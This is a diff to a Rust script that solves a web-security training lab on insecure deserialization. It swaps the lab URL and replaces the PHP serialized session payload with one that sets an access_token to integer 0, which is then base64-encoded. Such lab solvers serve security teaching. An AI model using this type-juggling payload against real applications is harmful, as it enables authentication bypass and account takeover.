@@ -1,6 +1,6 @@
 /***************************************************************
 *
-* Lab: Modifying serialized data typess
+* Lab: Modifying serialized data types
 *
 * Hack Steps:
 *      1. Encode the serialized object after modifying
@@ -20,13 +20,13 @@ use std::{
 use text_colorizer::Colorize;
 
 // Change this to your lab URL
-const LAB_URL: &str = "https://0a7700d404fccbff80c86cda00a300c2.web-security-academy.net";
+const LAB_URL: &str = "https://0ad70043046d41d2832b82b70023001b.web-security-academy.net";
 
 fn main() {
     print!("⦗1⦘ Encoding the serialized object after modifying.. ");
     flush_terminal();
 
-    let serialized = r###"O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}"###;
+    let serialized = r###"O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}"###;
     let serialized_encoded = STANDARD.encode(serialized);
 
     println!("{}", "OK".green());
